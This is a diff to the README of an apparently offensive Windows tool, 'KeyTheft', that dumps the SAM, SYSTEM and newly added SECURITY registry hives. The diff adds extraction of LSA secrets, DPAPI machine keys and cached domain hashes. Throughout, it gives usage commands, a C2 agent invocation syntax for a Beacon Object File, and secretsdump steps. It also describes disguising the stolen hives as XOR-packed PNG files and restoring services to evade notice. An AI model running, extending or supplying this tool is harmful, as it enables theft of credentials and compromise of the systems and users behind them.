@@ -51,10 +51,10 @@ gcc -O2 -municode -o KeyTheft.exe KeyTheft.c -ladvapi32
 ## Usage
 
 ```
-KeyTheft.exe [sam_output.png] [system_output.png]
+KeyTheft.exe [sam_output.png] [system_output.png] [security_output.png]
 ```
 
-Run from an elevated console. The tool starts RemoteRegistry if needed, dumps both hives, then returns the service to its original state.
+Run from an elevated console. The tool starts RemoteRegistry if needed, dumps the requested hives, then returns the service to its original state. The third argument enables the SECURITY hive (LSA secrets). Use `-` in a position to skip that hive.
 
 ### Decoding
 
@@ -68,14 +68,16 @@ python3 decode.py $(cat system.png.key) system.png
 ### Hash extraction
 
 ```bash
-secretsdump.py -sam sam.hiv -system system.hiv LOCAL
+secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
 ```
 
-Or the standalone extractor (argument order: SAM first, SYSTEM second):
+Or the standalone extractor (argument order: SAM, SYSTEM, then optional SECURITY):
 
 ```bash
-python3 sam_extract.py sam.hiv system.hiv
+python3 sam_extract.py sam.hiv system.hiv [security.hiv]
 ```
+
+With the SECURITY hive the extractor also dumps LSA secrets (service account passwords, DPAPI machine keys, `DefaultPassword`) and cached domain logon hashes (DCC2), matching `secretsdump.py` output.
 
 ## Files
 
@@ -100,14 +102,14 @@ x86_64-w64-mingw32-gcc -c -O2 -fno-builtin -o KeyTheftBof.x64.o KeyTheftBof.c
 Agent invocation (the agent packs the argument string):
 
 ```
-go p=<1|0> k=<0|1> sam=<path.png> sys=<path.png>
+go p=<1|0> k=<0|1> sam=<path.png> sys=<path.png> sec=<path.png>
 ```
 
 - `p=1` (default) XOR+PNG packs each file and prints the key per file; `p=0` renames the raw hive instead
 - `k=1` keeps the plaintext `.tmp` on disk (testing only)
-- `sam=` / `sys=` paths, use either or both
+- `sam=` / `sys=` / `sec=` paths, use any combination; `sec=` targets the SECURITY hive through a `REG_OPTION_BACKUP_RESTORE` open
 
- Tested with [COFFLoader](https://github.com/trustedsec/COFFLoader) on Windows 11: handle theft, service re-enable/restore (signed `sc.exe` fallback), packing and boot key all verified; decoded output matches `secretsdump.py`.
+ Tested with [COFFLoader](https://github.com/trustedsec/COFFLoader) on Windows 11: handle theft, SECURITY access via backup semantics, service re-enable/restore (signed `sc.exe` fallback), packing and boot key all verified; decoded output matches `secretsdump.py`.
 
 ## C# module
 
@@ -121,7 +123,8 @@ KeyTheftCS.exe [--sam <path>] [--system <path>] [--pack png|none] [--keep-temp] 
 Differences from the C version:
 
 - `--pack none` writes raw `.hiv` files, `--pack png` (default) applies the XOR/PNG disguise with one key per file.
-- Exit codes: 0 both hives, 2 partial, 1 failure, 3 bad args.
+- `--security <path>` adds the SECURITY hive (same backup-restore open as the BOF).
+- Exit codes: 0 all requested hives, 2 partial, 1 failure, 3 bad args.
 - Keys and final status print to stdout even in `--quiet` mode.
 - The service restore uses `ControlService` first and falls back to the signed `sc.exe` when the host process is unsigned and the target runs Windows 11.
 
